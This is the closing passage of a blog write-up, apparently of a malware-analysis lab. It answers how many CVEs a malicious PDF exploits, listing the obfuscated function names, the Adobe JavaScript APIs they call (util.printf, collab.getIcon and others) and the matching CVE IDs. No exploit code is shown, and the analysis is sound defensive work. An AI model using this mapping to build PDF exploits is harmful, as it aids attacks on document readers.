</code></pre><h2 id="11-how-many-cves-are-included-in-the-pdf-file">11. How many CVEs are included in the PDF file?</h2>
<p>Running every function separately on &lsquo;pdf stream dumper&rsquo; javascript emulator I get 4 CVE. And found another one from virustotal.</p>
<p>cN(); util.printf() called - CVE-2008-2992
gX(); collab.collectEmailInfo() called - CVE-2007-5659
updateE(); collab.getIcon() called - CVE-2009-0927
nO(); media.newPlayer called - CVE-2009-4324
detected by virus total CVE-2010-0188</p>

            </div>
        </article></main>
</div>
<footer class="footer">
    <span class="footer_item"> </span>
    &nbsp;

    <small class="footer_copyright">
        © 2023 Naimul Islam.
    </small>
</footer><a href="#" title="Go to top" id="totop">
    <svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" fill="currentColor" stroke="currentColor" viewBox="0 96 960 960">
    <path d="M283 704.739 234.261 656 480 410.261 725.739 656 677 704.739l-197-197-197 197Z"/>
</svg>

</a>


    




    
    
        
    

    
    
        
    



    
    <script src="https://naimulislam9m.github.io/js/main.min.35f435a5d8eac613c52daa28d8af544a4512337d3e95236e4a4978417b8dcb2f.js" integrity="sha256-NfQ1pdjqxhPFLaoo2K9USkUSM30&#43;lSNuSkl4QXuNyy8="></script>

    

</body>
</html>
